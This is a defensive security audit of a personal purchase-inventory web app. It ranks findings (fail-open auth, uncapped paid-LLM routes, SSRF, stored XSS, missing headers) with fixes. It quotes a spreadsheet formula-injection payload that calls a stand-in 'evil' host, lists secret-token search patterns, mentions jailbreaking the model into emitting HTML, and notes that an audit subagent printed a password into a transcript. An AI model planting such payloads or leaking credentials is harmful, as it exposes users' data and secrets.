# Security Audit — Purchase-Inventory

**Date:** 2026-08-03. **Method:** adversarial single-lens audit (auth, secrets, web/API, infra) with live verification against `https://inventory.tomkeefe.ai`. **Threat model:** app is on a public hostname discoverable via Certificate Transparency; assume an unauthenticated stranger finds it. Single-user (Tom), possibly +partner, possibly public later. Holds email-derived purchase history; calls paid Anthropic APIs. GitHub repo is **public**.

The remediation plan for everything below is `docs/superpowers/plans/2026-08-03-security-hardening.md`.

## Verdict

**Not wide-open, but not yet safe to open further.** Live checks confirm HTTP Basic Auth returns 401 on every route including the paid `chat` endpoint. But there is no defense behind that single password: if it ever falls open, unbounded paid-API spend, an SSRF primitive, and a stored-XSS path are all directly exposed. Fix the Critical/Important items before widening access.

## Critical (fix before it stays public)

Nothing is *currently* unauthenticated — auth is live. The items below are Critical because they are the load-bearing gaps: the first makes all others reachable, the second spends real money.

- **Auth fails open if `WEB_USER`/`WEB_PASSWORD` unset** — `middleware.ts:17` — returns `undefined` (no auth on any route, including all mutating + paid APIs) with no log or alert. Vars are set today (verified via Railway CLI), so not live-exploitable now, but one bad redeploy silently exposes everything. There is no route-level defense-in-depth; the whole API surface depends on this one gate. — *Fix: fail closed in production (500 when creds absent).* → Plan Task 1.
- **No rate limit or spend ceiling on the four paid-LLM routes** — `app/api/photography/{chat,learn,start,submit}/route.ts` — `chat` runs up to 8 Opus 4.7 calls per message with no cap on calls/minute/hour/day; `learn` has no cooldown; `submit` allows unlimited grading retries. A scripted loop (behind or past the password) bills indefinitely. This is the owner's stated top concern. — *Fix: per-IP rate limit + daily spend ceiling + retry cap.* → Plan Tasks 2–3.

## Important (fix this week)

- **Google Sheets formula injection** — `submit` caption → `lib/photographySheets.ts:321` writes user free-text with `valueInputOption: 'USER_ENTERED'`. A caption like `=IMPORTXML("http://evil/","//a")` executes as a live formula next time Tom opens the sheet. — *Fix: neutralize leading `=+-@`.* → Plan Task 4.
- **Unsanitized markdown → stored XSS** — `app/components/markdown.tsx` uses `dangerouslySetInnerHTML` with no sanitizer; the chat drawer (`photo-brain-drawer.tsx:187`) renders LLM replies through it, and chat history is a single shared `chatId='web'` buffer, so an injected payload renders in Tom's browser. Contingent on jailbreaking the model into emitting raw HTML; the render pipeline itself is confirmed unsafe. — *Fix: DOMPurify.* → Plan Task 5.
- **SSRF via image-download `url` field** — `lib/integrations/image-storage.ts:72` fetches a user-supplied URL after only a `new URL()` syntax check; no block on `169.254.169.254`, loopback, RFC1918, or `*.railway.internal`. Blind SSRF with a 3-way response oracle usable to fingerprint internal Railway services. — *Fix: private-IP/metadata blocklist before fetch.* → Plan Task 6.
- **No security headers** — confirmed live (only `server: railway-hikari`): no `X-Frame-Options`/CSP, HSTS, `X-Content-Type-Options`, `Referrer-Policy`; `X-Powered-By` advertises Next.js. Clickjacking on a purchase/financial dashboard. — *Fix: `headers()` in `next.config.js` + `poweredByHeader:false`.* → Plan Task 7.
- **No auth-failure observability or throttle** — confirmed live: 8 wrong-password attempts served in ~80–150ms with no throttle, no log. A brute-force run is invisible; only credential strength stands in the way. — *Fix: log 401s + per-IP throttle.* → Plan Task 8.

## Minor (worth doing eventually)

- **Public-repo identifiers** — real Google Sheet ID (`.env.example:5`, `docs/PLAN.md`, `docs/PRODUCT.md`, `docs/DEPLOY.md`) and Tom's Gmail (`.env.example:6`, `CLAUDE.md:141`) committed in a public repo; plus a `.gitignore` glob mismatch (`tests/fixtures/{rei,amazon}/*.html` vs the flat `tests/fixtures/*.html` files actually tracked) that risks silently committing future real-order fixtures. Not bearer secrets (reads need the OAuth token). → Plan Task 9.
- **Non-constant-time credential comparison** — `middleware.ts:21` uses `===`. Theoretical over the internet. → Plan Task 10.
- **Next.js 14.2.35** — carries core SSRF/DoS advisories with no 14.x fix (only 15.5.x); a real migration. Feature surface (no `next/image`, no Server Actions, no i18n) narrows applicability. → Plan Task 11.
- **`node-telegram-bot-api@0.66.0`** — pulls the deprecated `request`/`form-data` chain (2 criticals); bot fetch targets are Telegram-controlled, so low exploitability. → Plan Task 12.
- **Env-var-name leak in 500 body** — `app/api/items/[itemId]/image/route.ts:88-93` returns `e.message` to authenticated callers. Low.
- **Raw error objects logged** — `console.error(..., err)` in several routes could log `googleapis` error objects carrying request config; Railway-log-only exposure. Low.

## Checked and clean

- **No live secrets** in the working tree or full `git --all` history (searched `sk-ant-`, `AKIA`, `AIza`, `ya29.`, `BEGIN PRIVATE KEY`, bot-token shape). `.env` gitignored and never committed; only `.env.example` tracked.
- **No `NEXT_PUBLIC_*` vars, no secret in the client bundle, no secret echoed in any API response.** Secrets read from `process.env` at composition roots, injected as config into `lib/`.
- **Middleware matcher covers all `/api/*` routes** — traced against all 7 route files; none implement (or bypass) independent auth. Only `_next/static`, `_next/image`, `favicon.ico` are exempt (no data).
- **Patched against the Next.js middleware-bypass CVE** (CVE-2025-29927) — running 14.2.35 > 14.2.25.
- **Image path traversal not possible** — `itemId` is SHA-1-hashed before path use; serving route enforces `^[a-f0-9]{16}\.(jpg|jpeg|png|webp)$`.
- **Telegram bot** uses gated long-polling (`getUpdates`), not a public webhook; every message checked against `authorizedChatIds`.
- **No CORS wildcard**, no `child_process`/`eval`/shell reached by user input, no SQL (Sheets-backed). Destructive npm scripts are CLI-only, not wired to any route. Web service binds `0.0.0.0`/`$PORT` correctly.
- **`web_search` allowed-domains** are hardcoded, not user-steerable.

## Not applicable

- **IDOR on `[itemId]` routes** — single-user app; no other user's data to protect. Revisit only if multi-user.
- **Distributed rate-limit store** — single Railway web instance; in-memory is sufficient (documented as a scaling limitation).
- **git history rewrite for sheet ID/email** — not bearer secrets; scrubbing forward suffices.

## Note

During the audit, a subagent's Railway CLI check briefly printed `WEB_PASSWORD` into the session transcript. It was not published anywhere. Rotate it in Railway (set the new value directly in the variable store) if you want to be conservative.
